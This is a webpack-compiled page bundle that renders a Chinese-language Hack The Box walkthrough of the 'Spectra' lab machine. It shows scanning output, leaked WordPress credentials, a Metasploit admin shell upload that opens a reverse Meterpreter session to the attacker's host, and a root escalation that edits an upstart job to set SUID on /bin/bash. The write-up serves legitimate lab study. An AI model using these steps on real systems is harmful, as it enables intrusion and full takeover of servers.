"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[9547],{72496:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>a,default:()=>p,frontMatter:()=>i,metadata:()=>o,toc:()=>c});var s=t(85893),r=t(11151);const i={},a="Spectra",o={id:"HackTheBox/Machines/Spectra/index",title:"Spectra",description:"Difficulty: Easy",source:"@site/docs/HackTheBox/Machines/Spectra/index.md",sourceDirName:"HackTheBox/Machines/Spectra",slug:"/HackTheBox/Machines/Spectra/",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Spectra/",draft:!1,unlisted:!1,editUrl:"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/Spectra/index.md",tags:[],version:"current",frontMatter:{},sidebar:"HackTheBox_Sidebar",previous:{title:"Runner",permalink:"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Runner/"},next:{title:"Sherlocks",permalink:"/Target-Machines-WriteUp/docs/category/HackTheBox-Sherlocks"}},d={},c=[{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"Web service",id:"web-service",level:2},{value:"Wordpress \u6f0f\u626b",id:"wordpress-\u6f0f\u626b",level:3},{value:"\u76ee\u5f55\u7206\u7834",id:"\u76ee\u5f55\u7206\u7834",level:3},{value:"Wprdpress \u540e\u53f0",id:"wprdpress-\u540e\u53f0",level:3},{value:"User - nginx",id:"user---nginx",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"User - katie",id:"user---katie",level:2},{value:"flag - user",id:"flag---user",level:3},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b-1",level:3},{value:"initctl \u5229\u7528",id:"initctl-\u5229\u7528",level:3},{value:"User - root",id:"user---root",level:2},{value:"flag - root",id:"flag---root",level:3}];function l(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",p:"p",pre:"pre",...(0,r.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"spectra",children:"Spectra"}),"\n",(0,s.jsxs)(n.admonition,{type:"info",children:[(0,s.jsx)(n.p,{children:"Difficulty: Easy"}),(0,s.jsx)(n.p,{children:"Operating System: Other"})]}),"\n",(0,s.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="sudo nmap -A --min-rate=5000 -T5 -p- 10.10.10.229"',children:"PORT     STATE SERVICE    VERSION\n22/tcp   open  tcpwrapped\n| ssh-hostkey:\n|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)\n80/tcp   open  tcpwrapped\n|_http-server-header: nginx/1.17.4\n|_http-title: Site doesn't have a title (text/html).\n3306/tcp open  tcpwrapped\n"})}),"\n",(0,s.jsx)(n.h2,{id:"web-service",children:"Web service"}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u8bbf\u95ee"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ http get http://10.10.10.229/\nHTTP/1.1 200 OK\nAccept-Ranges: bytes\nConnection: keep-alive\nContent-Length: 283\nContent-Type: text/html\nDate: Mon, 25 Mar 2024 15:24:15 GMT\nETag: "6019d26f-11b"\nLast-Modified: Tue, 02 Feb 2021 22:30:07 GMT\nServer: nginx/1.17.4\n\n<h1>Issue Tracking</h1>\n\n<h2>Until IT set up the Jira we can configure and use this for issue tracking.</h2>\n\n<h2><a href="http://spectra.htb/main/index.php" target="mine">Software Issue Tracker</a></h2>\n<h2><a href="http://spectra.htb/testing/index.php" target="mine">Test</a></h2>\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u52a0\u5165 hosts \u8bb0\u5f55"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="/etc/hosts"',children:"10.10.10.229 spectra.htb\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7136\u540e\u7ee7\u7eed\u8bbf\u95ee ",(0,s.jsx)(n.code,{children:"http://spectra.htb/main/"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(88691).Z+"",width:"2560",height:"1371"})}),"\n",(0,s.jsx)(n.h3,{id:"wordpress-\u6f0f\u626b",children:"Wordpress \u6f0f\u626b"}),"\n",(0,s.jsx)(n.p,{children:"\u4e00\u773c Wordpress \u6846\u67b6\uff0c\u4e0a\u626b\u63cf\u5668\u770b\u770b"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="wpscan --url http://spectra.htb/main/"',children:"[+] Headers\n | Interesting Entries:\n |  - Server: nginx/1.17.4\n |  - X-Powered-By: PHP/5.6.40\n | Found By: Headers (Passive Detection)\n | Confidence: 100%\n\n[+] XML-RPC seems to be enabled: http://spectra.htb/main/xmlrpc.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n | References:\n |  - http://codex.wordpress.org/XML-RPC_Pingback_API\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/\n |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/\n |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/\n\n[+] WordPress readme found: http://spectra.htb/main/readme.html\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 100%\n\n[+] The external WP-Cron seems to be enabled: http://spectra.htb/main/wp-cron.php\n | Found By: Direct Access (Aggressive Detection)\n | Confidence: 60%\n | References:\n |  - https://www.iplocation.net/defend-wordpress-from-ddos\n |  - https://github.com/wpscanteam/wpscan/issues/1299\n\n[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).\n | Found By: Rss Generator (Passive Detection)\n |  - http://spectra.htb/main/?feed=rss2, <generator>https://wordpress.org/?v=5.4.2</generator>\n |  - http://spectra.htb/main/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.2</generator>\n\n[+] WordPress theme in use: twentytwenty\n | Location: http://spectra.htb/main/wp-content/themes/twentytwenty/\n | Last Updated: 2024-01-16T00:00:00.000Z\n | Readme: http://spectra.htb/main/wp-content/themes/twentytwenty/readme.txt\n | [!] The version is out of date, the latest version is 2.5\n | Style URL: http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2\n | Style Name: Twenty Twenty\n | Style URI: https://wordpress.org/themes/twentytwenty/\n | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...\n | Author: the WordPress team\n | Author URI: https://wordpress.org/\n |\n | Found By: Css Style In Homepage (Passive Detection)\n |\n | Version: 1.2 (80% confidence)\n | Found By: Style (Passive Detection)\n |  - http://spectra.htb/main/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'\n\n[+] Enumerating All Plugins (via Passive Methods)\n\n[i] No plugins Found.\n\n[+] Enumerating Config Backups (via Passive and Aggressive Methods)\n Checking Config Backups - Time: 00:00:29 <=================================================================================================================================> (137 / 137) 100.00% Time: 00:00:29\n\n[i] No Config Backups Found.\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6ca1\u6709\u53d1\u73b0\u6709\u4ef7\u503c\u4fe1\u606f"}),"\n",(0,s.jsx)(n.h3,{id:"\u76ee\u5f55\u7206\u7834",children:"\u76ee\u5f55\u7206\u7834"}),"\n",(0,s.jsx)(n.p,{children:"\u5c1d\u8bd5\u76ee\u5f55\u626b\u63cf"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",metastring:'title="dirsearch -u http://spectra.htb/"',children:"[23:41:51] Starting:\n[23:44:01] 301 -  169B  - /main  ->  http://spectra.htb/main/\n[23:44:09] 200 -   25KB - /main/\n[23:44:56] 301 -  169B  - /testing  ->  http://spectra.htb/testing/\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u770b\u770b ",(0,s.jsx)(n.code,{children:"/testing"})," \u76ee\u5f55\u91cc\u9762\u6709\u4ec0\u4e48"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(35541).Z+"",width:"2560",height:"1371"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5728\u5176\u4e2d\uff0c\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u8bfb\u53d6 php \u6587\u4ef6\uff0c\u56e0\u4e3a\u4f1a\u88ab\u89e3\u6790\uff0c\u4f46\u662f\u5176\u4e2d\u7684 ",(0,s.jsx)(n.code,{children:"wp-config.php.save"})," \u6587\u4ef6\u5c31\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-php",children:"?php\n/**\n * The base configuration for WordPress\n *\n * The wp-config.php creation script uses this file during the\n * installation. You don't have to use the web site, you can\n * copy this file to \"wp-config.php\" and fill in the values.\n *\n * This file contains the following configurations:\n *\n * * MySQL settings\n * * Secret keys\n * * Database table prefix\n * * ABSPATH\n *\n * @link https://wordpress.org/support/article/editing-wp-config-php/\n *\n * @package WordPress\n */\n\n// ** MySQL settings - You can get this info from your web host ** //\n/** The name of the database for WordPress */\ndefine('DB_NAME', 'dev');\n\n/** MySQL database username */\ndefine('DB_USER', 'devtest');\n\n/** MySQL database password */\ndefine('DB_PASSWORD', 'devteam01');\n\n/** MySQL hostname */\ndefine('DB_HOST', 'localhost');\n\n/** Database Charset to use in creating database tables. */\ndefine('DB_CHARSET', 'utf8');\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine('DB_COLLATE', '');\n\n/**#@+\n * Authentication Unique Keys and Salts.\n *\n * Change these to different unique phrases!\n * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}\n * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.\n *\n * @since 2.6.0\n */\ndefine('AUTH_KEY',         'put your unique phrase here');\ndefine('SECURE_AUTH_KEY',  'put your unique phrase here');\ndefine('LOGGED_IN_KEY',    'put your unique phrase here');\ndefine('NONCE_KEY',        'put your unique phrase here');\ndefine('AUTH_SALT',        'put your unique phrase here');\ndefine('SECURE_AUTH_SALT', 'put your unique phrase here');\ndefine('LOGGED_IN_SALT',   'put your unique phrase here');\ndefine('NONCE_SALT',       'put your unique phrase here');\n\n/**#@-*/\n\n/**\n * WordPress Database Table prefix.\n *\n * You can have multiple installations in one database if you give each\n * a unique prefix. Only numbers, letters, and underscores please!\n */\n$table_prefix = 'wp_';\n\n/**\n * For developers: WordPress debugging mode.\n *\n * Change this to true to enable the display of notices during development.\n * It is strongly recommended that plugin and theme developers use WP_DEBUG\n * in their development environments.\n *\n * For information on other constants that can be used for debugging,\n * visit the documentation.\n *\n * @link https://wordpress.org/support/article/debugging-in-wordpress/\n */\ndefine('WP_DEBUG', false);\n\n/* That's all, stop editing! Happy publishing. */\n\n/** Absolute path to the WordPress directory. */\nif (! defined( 'ABSPATH') ) {\n    define('ABSPATH', __DIR__ . '/');\n}\n\n/** Sets up WordPress vars and included files. */\nrequire_once ABSPATH . 'wp-settings.php';\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u6570\u636e\u5e93\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u8fde\u63a5\uff0c\u6b64\u6587\u4ef6\u63d0\u4f9b\u7684\u51ed\u636e\u4e5f\u6ca1\u6709\u529e\u6cd5\u76f4\u63a5\u767b\u5f55 Wordpress \u540e\u53f0\u3002\u7ecf\u8fc7\u5728 Wordpress \u524d\u53f0\u8fdb\u884c\u641c\u96c6\uff0c\u53d1\u73b0\u7528\u6237 ",(0,s.jsx)(n.code,{children:"administrator"})]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:"username: administrator\npassword: devteam01\n"})}),"\n",(0,s.jsx)(n.h3,{id:"wprdpress-\u540e\u53f0",children:"Wprdpress \u540e\u53f0"}),"\n",(0,s.jsxs)(n.p,{children:["\u8bbf\u95ee ",(0,s.jsx)(n.code,{children:"http://spectra.htb/main/wp-login.php"})]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{alt:"img",src:t(33018).Z+"",width:"2560",height:"1371"})}),"\n",(0,s.jsx)(n.p,{children:"\u786e\u5b9a\u51ed\u636e\u6ca1\u6709\u95ee\u9898\u7684\u8bdd\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 Metasploit \u8fdb\u884c\u653b\u51fb"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"msf6 > use exploit/unix/webapp/wp_admin_shell_upload\n[*] No payload configured, defaulting to php/meterpreter/reverse_tcp\nmsf6 exploit(unix/webapp/wp_admin_shell_upload) > set USERNAME administrator\nUSERNAME => administrator\nmsf6 exploit(unix/webapp/wp_admin_shell_upload) > set PASSWORD devteam01\nPASSWORD => devteam01\nmsf6 exploit(unix/webapp/wp_admin_shell_upload) > set TARGETURI /main\nTARGETURI => /main\nmsf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts 10.10.10.229\nrhosts => 10.10.10.229\nmsf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.3\nlhost => 10.10.16.3\nmsf6 exploit(unix/webapp/wp_admin_shell_upload) > exploit\n\n[*] Started reverse TCP handler on 10.10.16.3:4444\n[*] Authenticating with WordPress using administrator:devteam01...\n[+] Authenticated with WordPress\n[*] Preparing payload...\n[*] Uploading payload...\n[*] Executing the payload at /main/wp-content/plugins/mtRtjnqZQL/kQUUQqKUaR.php...\n[*] Sending stage (39927 bytes) to 10.10.10.229\n[+] Deleted kQUUQqKUaR.php\n[+] Deleted mtRtjnqZQL.php\n[+] Deleted ../mtRtjnqZQL\n[*] Meterpreter session 1 opened (10.10.16.3:4444 -> 10.10.10.229:35186) at 2024-03-26 14:30:51 +0800\n\nmeterpreter > sysinfo\nComputer    : spectra\nOS          : Linux spectra 5.4.66+ #1 SMP Tue Dec 22 13:39:49 UTC 2020 x86_64\nMeterpreter : php/linux\n"})}),"\n",(0,s.jsx)(n.h2,{id:"user---nginx",children:"User - nginx"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"meterpreter > shell\nProcess 4661 created.\nChannel 1 created.\nsh: 0: getcwd() failed: No such file or directory\nsh: 0: getcwd() failed: No such file or directory\ncd /tmp\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\nnginx@spectra /tmp $ whoami\nwhoami\nnginx\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.p,{children:"\u53d1\u73b0\u654f\u611f\u51ed\u636e\u6587\u4ef6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="/etc/autologin/passwd"',children:"SummerHereWeCome!!\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u6839\u636e ",(0,s.jsx)(n.code,{children:"/home"})," \u76ee\u5f55\u4e0b\u7684\u6570\u636e\uff0c\u63a8\u6d4b\u4e3a ",(0,s.jsx)(n.code,{children:"katie"})," \u7528\u6237\u7684\u51ed\u636e"]}),"\n",(0,s.jsx)(n.h2,{id:"user---katie",children:"User - katie"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs katie@10.10.10.229\n[15:02:06] Welcome to pwncat \ud83d\udc08!\nPassword: ******************\n[15:02:24] 10.10.10.229:22: normalizing shell path\n[15:02:47] 10.10.10.229:22: registered new host w/ db\n(local) pwncat$ back\n(remote) katie@spectra:/home/katie$ whoami\nkatie\n"})}),"\n",(0,s.jsx)(n.h3,{id:"flag---user",children:"flag - user"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) katie@spectra:/home/katie$ cat user.txt\ne89d27fe195e9114ffa72ba8913a6130\n"})}),"\n",(0,s.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b-1",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="sudo -l"',children:"User katie may run the following commands on spectra:\n    (ALL) SETENV: NOPASSWD: /sbin/initctl\n"})}),"\n",(0,s.jsx)(n.h3,{id:"initctl-\u5229\u7528",children:"initctl \u5229\u7528"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) katie@spectra:/home/katie$ sudo /sbin/initctl list\ncrash-reporter-early-init stop/waiting\n......\ntest2 stop/waiting\n"})}),"\n",(0,s.jsxs)(n.p,{children:["\u5bf9\u8fd9\u4e2a ",(0,s.jsx)(n.code,{children:"test2"})," \u670d\u52a1\u8fdb\u884c\u4e0b\u624b"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",metastring:'title="/etc/init/test.conf"',children:'description "Test node.js server"\nauthor      "katie"\n\nstart on filesystem or runlevel [2345]\nstop on shutdown\n\nscript\n\n    export HOME="/srv"\n    echo $$ > /var/run/nodetest.pid\n    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js\n\nend script\n\npre-start script\n    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log\nend script\n\npre-stop script\n    rm /var/run/nodetest.pid\n    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log\nend script\n'})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",metastring:'title="/srv/nodetest.js"',children:"var http = require(\"http\");\n\nhttp.createServer(function (request, response) {\n   response.writeHead(200, {'Content-Type': 'text/plain'});\n\n   response.end('Hello World\\n');\n}).listen(8081);\n\nconsole.log('Server running at http://127.0.0.1:8081/');\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u4e24\u4e2a\u6587\u4ef6\u90fd\u662f\u53ef\u63a7\u7684\uff0c\u5728\u8fd9\u91cc\u9009\u62e9\u63a7\u5236\u670d\u52a1\u914d\u7f6e\u6587\u4ef6"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) katie@spectra:/home/katie$ vim /etc/init/test.conf\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-plaintext",children:'description "Test node.js server"\nauthor      "katie"\n\nstart on filesystem or runlevel [2345]\nstop on shutdown\n\nscript\n\n        chmod +s /bin/bash\n\nend script\n'})}),"\n",(0,s.jsx)(n.p,{children:"\u7136\u540e\u542f\u52a8\u670d\u52a1"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) katie@spectra:/home/katie$ sudo /sbin/initctl start test\ntest start/running, process 5172\n(remote) katie@spectra:/home/katie$ ls -lh /bin/bash\n-rwsr-sr-x 1 root root 540K Dec 22  2020 /bin/bash\n"})}),"\n",(0,s.jsx)(n.p,{children:"\u6210\u529f\u6267\u884c\u6076\u610f\u8d1f\u8f7d"}),"\n",(0,s.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) katie@spectra:/home/katie$ bash -p\n(remote) root@spectra:/home/katie# whoami\nroot\n"})}),"\n",(0,s.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-shell",children:"(remote) root@spectra:/root# cat root.txt\nd44519713b889d5e1f9e536d0c6df2fc\n"})})]})}function p(e={}){const{wrapper:n}={...(0,r.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},35541:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240313-141331-c39aeef58faeb4d7bd422e3818ff7d93.png"},33018:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240323-142344-5211b3e1fdafa486bba2220b5d1b75a9.png"},88691:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/image_20240326-232610-6880441116a5e018e1ec76138a526c28.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>o,a:()=>a});var s=t(67294);const r={},i=s.createContext(r);function a(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:a(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);